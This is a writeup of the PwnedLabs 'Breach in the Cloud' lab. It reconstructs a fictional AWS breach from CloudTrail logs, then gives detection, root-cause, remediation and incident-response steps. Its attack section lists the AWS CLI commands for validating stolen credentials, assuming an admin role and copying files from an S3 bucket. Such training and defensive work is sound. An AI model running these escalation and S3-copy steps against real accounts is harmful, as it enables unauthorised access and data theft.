# Breach in the Cloud — PwnedLabs Writeup
**Author:** Jashwanth | **Platform:** PwnedLabs | **Difficulty:** Beginner  
**Tags:** `AWS` `CloudTrail` `IAM` `S3` `Privilege Escalation` `Incident Response`  
**Date Solved:** April 2026 | **Approach:** Purple Team (Red + Blue)

---

> ⚠️ **Disclaimer:** This writeup is for educational purposes only. All commands were run inside a sanctioned lab environment. Never use these techniques against systems you don't own.

---

## Table of Contents
1. [Scenario](#1-scenario)
2. [Tools Used](#2-tools-used)
3. [Attack Path — What the Attacker Did](#3-attack-path--what-the-attacker-did)
4. [Blue Team — How I Detected It](#4-blue-team--how-i-detected-it)
5. [Root Cause Analysis](#5-root-cause-analysis)
6. [Remediation](#6-remediation)
7. [Real-World Playbook — If This Happens at Your Company](#7-real-world-playbook--if-this-happens-at-your-company)
8. [Key Takeaways](#8-key-takeaways)
9. [References](#9-references)

---

## 1. Scenario

**Company:** Huge Logistics (fictional)  
**Incident ID:** INCIDENT-3252  
**What we were given:** Compromised AWS access keys + CloudTrail logs from the time of the incident  
**Mission:** Confirm the breach, identify the compromised service, and determine if data was exfiltrated

**In plain English:**  
Someone got hold of a low-privilege AWS user's credentials. They used those credentials to explore the environment, escalate to an admin role, and steal a sensitive file from an S3 bucket — all while CloudTrail was silently logging every move.

---

## 2. Tools Used

| Tool | Purpose |
|------|---------|
| `aws cli` | Interact with AWS services, replicate attacker steps |
| `grep` | Filter CloudTrail JSON logs by username, event, IP |
| `jq` | Parse and pretty-print JSON log entries |
| `nano` | Inspect raw CloudTrail log files |
| `aws sts` | Verify caller identity (the AWS equivalent of `whoami`) |

---

## 3. Attack Path — What the Attacker Did

This is the full kill chain, reconstructed from CloudTrail logs.

```
[Compromised Credentials] → [Situational Awareness] → [Enumeration Brute Force]
        → [IAM Policy Discovery] → [AssumeRole → AdminRole] → [S3 Exfiltration]
```

### Step 1 — Attacker Verifies Credentials (Situational Awareness)

The attacker first confirmed that the stolen credentials were valid:

```bash
aws sts get-caller-identity
```

**What this returns:**
```json
{
  "UserId": "AIDARSCCN4A3X2YWZ37ZI",
  "Account": "107513503799",
  "Arn": "arn:aws:iam::107513503799:user/temp-user"
}
```

**CloudTrail event:** `GetCallerIdentity`  
**Source IP:** `84.32.71.19` (Turkey — not a region where Huge Logistics operates)  
**Time:** `2023-08-26T20:29:37Z`

> `GetCallerIdentity` is basically `whoami` for AWS. Attackers always run this first to confirm credentials work and understand their current privilege context.

---

### Step 2 — S3 Bucket Discovery (Failed First Attempt)

The attacker tried to list an S3 bucket named `emergency-data-recovery`:

```bash
aws s3 ls s3://emergency-data-recovery
```

**Result:** `AccessDenied` — `temp-user` didn't have permission yet.

**CloudTrail event:** `ListObjects` → `AccessDenied`

---

### Step 3 — Noisy Enumeration (Brute-Force Permission Discovery)

Unable to access the bucket directly, the attacker brute-forced permissions by hammering every AWS API call possible:

```bash
# What the attacker behaviour looked like across logs
grep -r '"errorMessage"' *.json | wc -l
# Result: 450+ AccessDenied errors across IAM, DataPipeline, Comprehend, Route53...
```

**This is a classic attacker pattern** — when you can't read IAM policies directly, try everything and see what sticks. It's noisy, detectable, and a huge red flag in CloudTrail.

---

### Step 4 — IAM Policy Discovery (The Key Finding)

The attacker checked what policies were attached to `temp-user`:

```bash
aws iam list-user-policies --user-name temp-user
```

**Result:** Policy named `test-temp-user` was found.

```bash
aws iam get-user-policy --user-name temp-user --policy-name test-temp-user
```

**The policy revealed:** `temp-user` had `sts:AssumeRole` permission on `AdminRole`. This is the misconfiguration that made everything possible.

---

### Step 5 — Privilege Escalation via AssumeRole

The attacker assumed the `AdminRole`:

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::107513503799:role/AdminRole \
  --role-session-name attacker-session
```

This returned **temporary credentials** (Access Key + Secret Key + Session Token) valid for 1 hour — effectively granting admin access to the entire AWS account.

**CloudTrail event:** `AssumeRole` (success)

The attacker immediately verified their new context:

```bash
aws sts get-caller-identity
# Now shows: arn:aws:sts::107513503799:assumed-role/AdminRole/attacker-session
```

---

### Step 6 — Data Exfiltration from S3

With admin privileges, the attacker returned to the S3 bucket:

```bash
aws s3 ls s3://emergency-data-recovery --profile attacker
aws s3 cp s3://emergency-data-recovery/emergency.txt .
aws s3 cp s3://emergency-data-recovery/message.txt .
```

**CloudTrail events:** `ListObjects`  → `GetObject` 

**Data stolen:** `emergency.txt` — contained on-premise ERP credentials, warehouse system passwords, cloud recovery instructions, and IAM role information. Highly sensitive.

---

## 4. Blue Team — How I Detected It

### Detection Step 1 — Identify Suspicious Principals in Logs

```bash
# Extract all unique usernames from logs
grep -h "userName" *.json | sort | uniq
```

**Finding:** `temp-user` appeared — doesn't match the company's naming convention (first red flag).

### Detection Step 2 — Trace the Suspicious User Chronologically

```bash
# Start from earliest log (T2035)
grep -h -A 10 "temp-user" 107513503799_CloudTrail_us-east-1_20230826T2035Z_*.json
```

**Finding:** `GetCallerIdentity` from IP `84.32.71.19` (Turkey)

### Detection Step 3 — Confirm the IP is Anomalous

```bash
# Check IP geolocation — not a Huge Logistics operating region
# IP: 84.32.71.19 → Cherry Servers, Turkey
```

**IoC confirmed:** External, unexpected geography.

### Detection Step 4 — Count the Noise

```bash
grep -r '"errorCode": "AccessDenied"' *.json | wc -l
# Result: 450+ — this is automated enumeration, not a human clicking around
```

### Detection Step 5 — Find the AssumeRole Event

```bash
grep -A 20 "AssumeRole" *.json | grep -i temp-user
```

**Finding:** `temp-user` assumed `AdminRole` at `2023-08-26T21:00Z`

### Detection Step 6 — Confirm Data Exfiltration

```bash
grep -R '"eventSource": "s3.amazonaws.com"' .
grep -A 20 "ListObjects" 107513503799_CloudTrail_us-east-1_20230826T2120Z_*.json
grep -A 20 "GetObject" 107513503799_CloudTrail_us-east-1_20230826T2120Z_*.json
```

**Finding:** `emergency.txt` and `message.txt` downloaded via `GetObject` 

### Full Timeline Reconstructed

```
20:29Z  → GetCallerIdentity (temp-user, Turkey IP)
20:40Z  → ListObjects on emergency-data-recovery → AccessDenied
20:40-21:00Z → 450+ AccessDenied brute-force enumeration
21:00Z  → AssumeRole → AdminRole (SUCCESS)
21:05Z  → GetCallerIdentity (confirms AdminRole context)
21:20Z  → ListObjects + GetObject → emergency.txt exfiltrated 
```

---

## 5. Root Cause Analysis

| # | Root Cause | Severity |
|---|-----------|---------|
| 1 | `temp-user` had `sts:AssumeRole` on `AdminRole` — a low-privilege user could jump to full admin |   Critical |
| 2 | No MFA enforced on `temp-user` — credentials alone were enough |   Critical |
| 3 | `emergency-data-recovery` S3 bucket had no additional access controls beyond IAM |   High |
| 4 | No GuardDuty alerts triggered for anomalous geo-location or brute-force enumeration |   High |
| 5 | `temp-user` naming doesn't follow convention — no automated detection for rogue IAM users |   Medium |
| 6 | No S3 bucket encryption or data classification on sensitive files |   Medium |

---

## 6. Remediation

### Immediate (within 1 hour of detection)

```bash
# 1. Disable the compromised user immediately
aws iam update-login-profile --user-name temp-user --password-reset-required
aws iam delete-access-key --user-name temp-user --access-key-id AKIARSCCN4A3WD4RO4P4

# 2. Revoke all active sessions for AdminRole
aws iam put-role-policy --role-name AdminRole --policy-name DenyAll --policy-document '{
  "Version": "2012-10-17",
  "Statement": [{"Effect": "Deny", "Action": "*", "Resource": "*"}]
}'

# 3. Snapshot the S3 bucket state for forensics
aws s3api get-bucket-acl --bucket emergency-data-recovery
aws s3api get-bucket-policy --bucket emergency-data-recovery
```

### Short-Term (within 24 hours)

**Fix the IAM policy — apply Least Privilege:**
```json
// BEFORE (what temp-user had)
{
  "Effect": "Allow",
  "Action": "sts:AssumeRole",
  "Resource": "arn:aws:iam::107513503799:role/AdminRole"
}

// AFTER (what it should be)
// Remove AssumeRole on AdminRole entirely
// If temp-user needs specific access, create a scoped role for ONLY that task
```

**Enforce MFA on all IAM users:**
```json
{
  "Effect": "Deny",
  "Action": "*",
  "Resource": "*",
  "Condition": {
    "BoolIfExists": {"aws:MultiFactorAuthPresent": "false"}
  }
}
```

**Restrict S3 bucket with explicit deny:**
```json
{
  "Effect": "Deny",
  "Principal": "*",
  "Action": "s3:GetObject",
  "Resource": "arn:aws:s3:::emergency-data-recovery/*",
  "Condition": {
    "StringNotEquals": {"aws:PrincipalArn": "arn:aws:iam::107513503799:role/AuthorizedRecoveryRole"}
  }
}
```

### Long-Term (within 1 week)

- Enable **AWS GuardDuty** — would have flagged the geo-anomaly and brute-force automatically
- Enable **AWS Config** — detect IAM policy drift
- Set up **CloudTrail → CloudWatch alarms** for `AssumeRole` events from external IPs
- Apply **SCPs (Service Control Policies)** via AWS Organizations to prevent any non-admin role from assuming AdminRole
- Enable **S3 Object-Level Logging** for all sensitive buckets
- Enforce **IAM naming conventions** via policy and audit regularly

---

## 7. Real-World Playbook — If This Happens at Your Company

> This section is what makes this writeup useful beyond the lab. If you're a SOC analyst, cloud security engineer, or incident responder and you encounter something similar in production — follow this.

### Detection Triggers (What should alert you)

| Signal | Source | Action |
|--------|--------|--------|
| `GetCallerIdentity` from unknown IP | CloudTrail | Investigate immediately |
| 50+ `AccessDenied` errors from single user in <5 min | CloudTrail / CloudWatch | Auto-trigger IR workflow |
| `AssumeRole` event from a temp/service account | CloudTrail | Verify with account owner |
| `GetObject` on sensitive bucket from assumed role | CloudTrail | Confirm data access was authorized |
| Login from unexpected geography | GuardDuty | Block IP, notify security team |

### Incident Response Steps (Production)

```
1. CONTAIN   → Disable IAM user, revoke session tokens, isolate affected role
2. PRESERVE  → Export all CloudTrail logs to S3 with Object Lock (immutable)
3. ANALYSE   → Reconstruct timeline (same grep/jq approach used above)
4. SCOPE     → Check every GetObject / PutObject in the last 30 days for that user
5. NOTIFY    → Legal/compliance team if PII or regulated data was in the S3 bucket
6. REMEDIATE → Fix IAM policies, enable MFA, tighten bucket policies
7. HARDEN    → Enable GuardDuty, Config Rules, CloudWatch alarms
8. REVIEW    → Post-incident report → update runbooks
```

### Key AWS CLI Commands for Real IR

```bash
# Find all actions by a suspicious user across all log files
grep -r "suspicious-user" /var/log/cloudtrail/ | grep -v "AccessDenied"

# Find all AssumeRole events in last 24h
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole \
  --start-time $(date -d '24 hours ago' +%s)

# List all active access keys for a user
aws iam list-access-keys --user-name suspicious-user

# Find all S3 GetObject events for a specific bucket
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=ResourceName,AttributeValue=emergency-data-recovery

# Check if GuardDuty is enabled
aws guardduty list-detectors

# Check for any ongoing sessions from a role
aws iam list-roles | grep -i admin
```

---

## 8. Key Takeaways

| # | Lesson | Apply Where |
|---|--------|------------|
| 1 | `GetCallerIdentity` from unknown IP = immediate red flag | Any AWS environment |
| 2 | 400+ AccessDenied = automated enumeration, not a human | CloudTrail analysis |
| 3 | `AssumeRole` is the #1 privilege escalation vector in AWS | IAM policy review |
| 4 | Low-privilege users should NEVER have AssumeRole on admin roles | IAM hardening |
| 5 | S3 buckets with sensitive data need bucket policies AND IAM — never rely on one | S3 security |
| 6 | CloudTrail alone isn't enough — you need GuardDuty + alerting on top | Detection stack |
| 7 | Naming conventions for IAM users matter — deviations should auto-alert | Account hygiene |

---

## 9. References

- [AWS CloudTrail Documentation](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-log-file-examples.html)
- [AWS STS AssumeRole](https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRole.html)
- [AWS GuardDuty — IAM findings](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-iam.html)
- [MITRE ATT&CK — Valid Accounts: Cloud](https://attack.mitre.org/techniques/T1078/004/)
- [MITRE ATT&CK — Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002/)
- [PwnedLabs — Breach in the Cloud](https://pwnedlabs.io)

---

*Solved by Jashwanth | [GitHub](https://github.com/JashwanthMU) | Part of the `aws-cloud-security-labs` writeup series*
